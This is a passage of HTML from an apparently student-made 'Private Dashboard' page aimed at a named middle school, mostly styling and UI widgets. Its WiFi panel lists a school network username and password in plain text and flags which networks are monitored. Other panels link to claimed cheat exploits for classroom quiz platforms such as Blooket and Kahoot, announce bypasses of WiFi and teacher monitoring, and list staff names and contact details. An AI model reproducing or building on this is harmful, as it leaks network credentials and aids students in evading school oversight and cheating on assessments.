        font-family: 'Orbitron', sans-serif;
        color: var(--neon-glow-color-strong);
    }
    .timer-controls button {
        margin: 5px;
    }

    /* Settings Panel */
    .settings-group {
        margin-bottom: 20px;
        padding: 15px;
        border: 1px solid #555;
        border-radius: 8px;
        background-color: #3a3a3a;
        box-shadow: 0 0 5px rgba(0,0,0,0.3);
    }
    .light-theme .settings-group {
        border-color: #bbb;
        background-color: #e0e0e0;
    }

    .settings-group h3 {
        color: var(--neon-glow-color-medium);
        margin-top: 0;
        margin-bottom: 10px;
        border-bottom: 1px dashed #555;
        padding-bottom: 5px;
    }
    .light-theme .settings-group h3 {
        color: var(--accent-color-light);
        border-bottom-color: #bbb;
    }

    .setting-item {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 10px;
        padding: 5px 0;
        border-bottom: 1px dotted #555;
    }
    .light-theme .setting-item { border-bottom-color: #bbb; }
    .setting-item:last-child { border-bottom: none; }

    .setting-item label {
        flex-grow: 1;
        margin-right: 10px;
        font-size: 1em;
    }
    .setting-item input[type="range"] {
      -webkit-appearance: none;
      width: 150px;
      height: 8px;
      background: #d3d3d3;
      outline: none;
      opacity: 0.7;
      transition: opacity .2s;
      border-radius: 5px;
    }
    .setting-item input[type="range"]::-webkit-slider-thumb {
      -webkit-appearance: none;
      appearance: none;
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: var(--accent-color-dark);
      cursor: pointer;
    }
    .setting-item input[type="color"] {
        border: none;
        padding: 0;
        width: 30px;
        height: 30px;
        cursor: pointer;
        border-radius: 4px;
        background: transparent;
    }
    .setting-item select {
        padding: 5px;
        border-radius: 5px;
        border: 1px solid #666;
        background-color: #333;
        color: #eee;
    }
    .light-theme .setting-item select {
        background-color: #f0f0f0;
        border-color: #ccc;
        color: #1a1a1a;
    }

    /* Keybinds Table */
    .keybinds-table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 15px;
        font-size: 0.9em;
    }
    .keybinds-table th, .keybinds-table td {
        border: 1px solid #555;
        padding: 8px;
        text-align: left;
    }
    .keybinds-table th {
        background-color: #3a3a3a;
        color: var(--neon-glow-color-medium);
        font-weight: bold;
    }
    .keybinds-table tr:nth-child(even) {
        background-color: #2a2a2a;
    }
    .keybinds-table tr:hover {
        background-color: #4a4a4a;
    }
    .light-theme .keybinds-table th { background-color: #e0e0e0; color: var(--accent-color-light); }
    .light-theme .keybinds-table td { border-color: #bbb; }
    .light-theme .keybinds-table tr:nth-child(even) { background-color: #f0f0f0; }
    .light-theme .keybinds-table tr:hover { background-color: #ddd; }


    /* Media panel */
    .media-player {
        margin-top: 15px;
        background-color: #333;
        border-radius: 8px;
        padding: 10px;
    }
    .media-player input[type="text"] {
        width: calc(100% - 70px);
        margin-right: 5px;
    }
    .media-player button {
        padding: 8px 12px;
    }
    #youtubePlayer {
        width: 100%;
        height: 315px; /* Standard YouTube embed height */
        border: none;
        margin-top: 10px;
        border-radius: 5px;
    }

    /* Activity and Login History styles */
    .log-entry {
        background: #333;
        padding: 10px;
        margin-bottom: 5px;
        border-radius: 6px;
        border-left: 5px solid var(--accent-color-dark);
        word-wrap: break-word; /* Prevent overflow */
    }
    .log-entry.error-log { border-color: #dc3545; }
    .log-entry span {
        display: block;
        font-size: 0.9em;
        color: #ccc;
    }
    .light-theme .log-entry {
        background: #e0e0e0;
        border-left-color: var(--accent-color-light);
    }
    .light-theme .log-entry span { color: #1a1a1a; }


    /* Draggable handles on boxes */
    .ui-resizable-handle {
        background: var(--neon-glow-color-medium) !important;
        opacity: 0.5 !important;
    }

  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
  <!-- Random Facts and Quotes API from external sources -->
  <script>
    // These functions fetch data from free public APIs.
    // Replace with a custom backend if you need more control or reliable content.
    async function fetchRandomFact() {
      try {
        const response = await fetch('https://uselessfacts.jsph.pl/random.json?language=en');
        const data = await response.json();
        return data.text;
      } catch (error) {
        console.error("Error fetching random fact:", error);
        return "Fact not available at this moment. Please try again later.";
      }
    }

    async function fetchDailyQuote() {
      try {
        const response = await fetch('https://api.quotable.io/random');
        const data = await response.json();
        return `"${data.content}" - ${data.author}`;
      } catch (error) {
        console.error("Error fetching daily quote:", error);
        return "Quote not available at this moment. Please try again later.";
      }
    }
  </script>
</head>
<body class="login-body" id="bodyElement">

  <!-- Initial Loading Screen -->
  <div id="loadingScreen">
    <div class="cube-container">
      <div class="cube">
        <div class="cube__face cube__face--front"></div>
        <div class="cube__face cube__face--back"></div>
        <div class="cube__face cube__face--right"></div>
        <div class="cube__face cube__face--left"></div>
        <div class="cube__face cube__face--top"></div>
        <div class="cube__face cube__face--bottom"></div>
      </div>
    </div>
    <div id="loadingText" class="loading-text">Initializing System...</div>
  </div>

  <!-- Login Page Container (hidden until loaded) -->
  <div class="login-page-container" id="loginPageContainer" style="display: none; opacity: 0;">

    <div class="login-quick-bar">
      <button id="loginPanicBtn" class="panic-button">üö® Panic</button>
      <button id="loginZoomInBtn">‚ûï Zoom In</button>
      <button id="loginZoomOutBtn">‚ûñ Zoom Out</button>
      <button id="loginActivityLogsBtn">üìÉ Activity Logs</button>
      <button id="loginHistoryBtn">‚è∞ Login History</button>
    </div>

    <div class="login-box" id="loginBox">
      <h2>ùôãùôßùôûùô´ùôñùô©ùôö ùôéùôÆùô®ùô©ùôöùô¢</h2>

      <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
      <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
      <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

      <label for="showPassword" id="showPasswordLabel">
        <input type="checkbox" id="showPassword" />
        <span>Show Password</span>
      </label>

      <button id="submitBtn">Submit</button>

      <div class="error-message" id="errorMsg"></div>
      <div class="attempt-counter" id="attemptsText">Attempts Left: 3</div>

      <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
        <p>Too many failed attempts.</p>
        <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
        <button id="resetBtn">Reset Counter</button>
      </div>
    </div>

    <div class="login-time-date-box">
      <div id="loginCurrentDateTime" class="time-date-display">00:00:00 - Date</div>
      <div class="time-date-toggle-container">
          <label class="switch">
              <input type="checkbox" id="toggle24HrFormat">
              <span class="slider"></span>
          </label>
          <label for="toggle24HrFormat">24-Hr Format</label>
      </div>
    </div>
    <div id="loginActivityLogPanel" class="activity-logs-content">
        <h3>Login Activity Logs</h3>
        <div id="loginLogsDisplay">No login activity logged yet.</div>
    </div>
    <div id="loginHistoryPanel" class="login-history-content">
        <h3>Login History</h3>
        <div id="loginHistoryDisplay">No login history available.</div>
    </div>
  </div>

  <!-- Dashboard Loading Screen -->
  <div id="dashboardLoadingScreen">
    <div class="cube-container">
        <div class="cube" id="dashboardLoadingCube">
            <div class="cube__face cube__face--front"></div>
            <div class="cube__face cube__face--back"></div>
            <div class="cube__face cube__face--right"></div>
            <div class="cube__face cube__face--left"></div>
            <div class="cube__face cube__face--top"></div>
            <div class="cube__face cube__face--bottom"></div>
        </div>
    </div>
    <div class="loading-code-box">
      <span class="loading-code-text" id="dashboardLoadingCodeText">Loading Dashboard Resources...</span>
    </div>
  </div>


  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none; opacity: 0; padding-top: 50px;"> <!-- Add padding for fixed alert -->
    <div id="dashboardAlert" class="dashboard-alert">Welcome <span id="alertUserName"></span>!</div>

    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.5.7</div>
    </div>

    <div class="quick-bar">
      <button id="sessionTime">‚è≥ Session Time: 00:00:00</button>
      <button id="realTimeClock">üïí --:--:--</button>
      <button id="realDate">üìÖ --</button>
      <div class="search-container">
        <input type="text" id="quickbarSearchInput" placeholder="Search dashboard..." />
        <button id="quickbarSearchBtn">üîç</button>
      </div>
      <button id="notesBtn">üìí Notes</button>
      <button id="exportNotesBtn">üíæ Export Notes</button>
      <button id="screenshotBtn">üì∏ Screenshot</button>
      <button id="toggleSectionsBtn">‚¨ÜÔ∏è Toggle Sections</button>
      <button id="fixIssuesBtn">üõ†Ô∏è Fix Issues</button>
      <button id="fullScreenBtn">üñ•Ô∏è Full Screen</button>
      <button id="zoomInBtn">‚ûï Zoom In</button>
      <button id="zoomOutBtn">‚ûñ Zoom Out</button>
      <button id="restartBtn">üîÑ Restart</button>
      <button id="panicBtn">üö® Panic</button>
      <button id="themeToggle">üåô Dark Mode</button>
      <button id="settingsBtn">‚öôÔ∏è Settings</button>
      <button id="keybindsBtn">‚å®Ô∏è Keybinds</button>
      <button id="calculatorBtn">üßÆ Calculator</button>
      <button id="unitConverterBtn">‚ÜîÔ∏è Converter</button>
      <button id="timerStopwatchBtn">‚è±Ô∏è Timer/Stopwatch</button>
      <button id="activityLogsDashboardBtn">üìÉ Activity Logs</button>
      <button id="downloadActivityLogsBtn">‚¨áÔ∏è Download Logs</button>
      <button id="loginHistoryDashboardBtn">‚è∞ Login History</button>
      <button id="statsBtn">üìä Stats</button>
      <button id="mediaBtn">üì∫ Media</button>
      <button id="reminderBtn">üîî Reminder</button>
      <button id="logoutBtn">üîì Log Out</button>
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span>üö® Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! üö®</span>
    </div>
    
    <div class="main-row" id="mainGrid">
      
      <div class="box" id="calendarBox">
        <div class="box-handle">Drag Handle</div>
        <h2>üìÖ Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        <div class="box-handle">Drag Handle</div>
        "Success is not final, failure is not fatal: It is the courage to continue that counts." ‚Äì Winston Churchill
      </div>
      <div class="box facts-box" id="randomFactsBox">
        <div class="box-handle">Drag Handle</div>
        <h2>üí° Random Fact</h2>
        <p id="randomFactContent">Fetching a random fact...</p>
      </div>
      <div class="box quotes-box" id="dailyQuotesBox">
        <div class="box-handle">Drag Handle</div>
        <h2>‚ú® Daily Quote</h2>
        <p id="dailyQuoteContent">Fetching a daily quote...</p>
      </div>
    </div>

    <div class="main-row" id="updatesNotificationsRow" style="justify-content: center;">
      <div class="box" id="updatesBox" style="flex: 1 1 300px; min-width: 300px;">
        <div class="box-handle">Drag Handle</div>
        <h2>üîÑ Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
      </div>

      <div class="box" id="notificationsBox" style="flex: 1 1 300px; min-width: 300px;">
        <div class="box-handle">Drag Handle</div>
        <h2>üîî Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
      </div>
    </div>

    <!-- Information Panels (can be hidden/shown via buttons) -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üì° School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
          <div>Status</div> <!-- Added logging information -->
          <div>Last Detected</div> <!-- Added logging information -->
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div class="wifi-level-high">High</div>
          <div>WPA3 Enterprise</div>
          <div class="wifi-level-high">High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Active</div>
          <div>N/A</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div class="wifi-level-high">High</div>
          <div>WPA3 Enterprise</div>
          <div class="wifi-level-high">High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Active</div>
          <div>N/A</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div class="wifi-level-medium">Medium</div>
          <div>WPA3 Enterprise</div>
          <div class="wifi-level-medium">Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
          <div>Active</div>
          <div>N/A</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div class="wifi-level-low">Low</div>
          <div>WPA3 Enterprise</div>
          <div class="wifi-level-low">Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
          <div>Inactive</div>
          <div>N/A</div>
        </div>
        <div class="wifi-entry">
          <div>Other_Network</div>
          <div class="wifi-level-other">Other</div>
          <div>WEP</div>
          <div class="wifi-level-other">Low</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Inactive</div>
          <div>N/A</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üì± School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <p>Coming soon</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üìò Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üè´ School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üåê Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üë©‚Äçüè´ Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üìû School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üì∑ School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üè´ School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üß® Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üö™ Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming1Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming2Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming3Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üîê VPN Websites</h2>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üéÆ Gaming Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üéµ Music Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <div class="box-handle">Drag Handle</div>
        <h2>üéπ Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
‚Ä¢ Access Spotlight Search: Press¬†Command (‚åò) + Space bar.
‚Ä¢ Return to the Home screen: Press¬†Command (‚åò) + H.
‚Ä¢ Show the Dock: Press¬†Command (‚åò) + Option (‚å•) + D.
‚Ä¢ Show the App Library: Press¬†Shift (‚áß) + Globe + A.
‚Ä¢ Open Quick Note: Press Globe + Q.
‚Ä¢ Open Siri: Press Globe + S.
‚Ä¢ Open Control Center: Press Globe + C.
‚Ä¢ Open Notification Center: Press Globe + N.
‚Ä¢ Show all windows: Press¬†Globe + Down Arrow.
‚Ä¢ Open the App Switcher: Press¬†Globe + Up Arrow.
Multitasking Shortcuts:
‚Ä¢ Switch to the last active app: Press¬†Command (‚åò) + Tab.
‚Ä¢ View all active apps: Press and hold Command (‚åò) + Tab.
‚Ä¢ Open Split View: Press Control (‚åÉ) + Globe + Left Arrow to move an app to the left, or Control (‚åÉ) + Globe + Right Arrow to move it to the right.
‚Ä¢ Switch the position of apps in Split View: Press¬†Control (‚åÉ) + Globe + Left or Right Arrow.
‚Ä¢ Open Slide Over: Press Globe + Backslash.
‚Ä¢ Move the Slide Over window: Press¬†Option (‚å•) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
‚Ä¢ Take a full-screen screenshot: Press¬†Command (‚åò) + Shift + 3.
‚Ä¢ Take a screenshot and enter markup immediately: Press¬†Command (‚åò) + Shift + 4.
‚Ä¢ Open a new private tab: Press¬†Command (‚åò) + Shift + N.
‚Ä¢ Open a new tab: Press Command (‚åò) + T or Command (‚åò) + N.
‚Ä¢ Close the current tab: Press Command (‚åò) + W.
‚Ä¢ Close all tabs in Tab Grid: Press Shift + Command (‚åò) + W.
‚Ä¢ Go to the next tab: Press Option (‚å•) + Command (‚åò) + Right Arrow, or Control (‚åÉ) + Tab, or Command (‚åò) + }.
‚Ä¢ Go to the previous tab: Press Option (‚å•) + Command (‚åò) + Left Arrow, or Shift + Control (‚åÉ) + Tab, or Command (‚åò) + {.
‚Ä¢ Reopen the last closed tab: Press¬†Shift + Command (‚åò) + T.
‚Ä¢ Go to a specific tab (1-8): Press¬†Command (‚åò) + (1-8).
‚Ä¢ Go to the last tab: Press Command (‚åò) + 9.
‚Ä¢ Open the Tab Grid: Press Shift + Command (‚åò) + .
‚Ä¢ Open a new Incognito tab: Press¬†Shift + Command (‚åò) + N.
‚Ä¢ Open a new Incognito window: Press¬†Option (‚å•) + Shift + Command (‚åò) + N.
‚Ä¢ Open a new window: Press¬†Option (‚å•) + Command (‚åò) + N.
General Navigation and Text Editing:
‚Ä¢ Navigate between elements in an app (like fields, lists, buttons): Press Tab.
‚Ä¢ Select all text: Press Command (‚åò) + A.
‚Ä¢ Copy selected text: Press Command (‚åò) + C.
‚Ä¢ Cut selected text: Press Command (‚åò) + X.
‚Ä¢ Paste copied text: Press Command (‚åò) + V.
‚Ä¢ Undo the last action: Press Command (‚åò) + Z.
‚Ä¢ Redo the last undone action: Press Command (‚åò) + Shift + Z.
‚Ä¢ Jump to the top of a page: Press Command (‚åò) + Up Arrow.
‚Ä¢ Jump to the bottom of a page: Press Command (‚åò) + Down Arrow.
‚Ä¢ Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using,¬†press and hold the Command (‚åò) key.¬†For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>
    </div>

    <!-- Additional Dashboard Panels -->
    <div id="dynamicPanelsContainer" class="main-row" style="margin-top: 20px;">
        <div id="calculatorPanel" class="info-panel calculator-content">
            <div class="box-handle">Drag Handle</div>
            <h2>üßÆ Calculator</h2>
            <div class="calculator-grid">
                <div id="calc-display">0</div>
                <button class="clear">C</button>
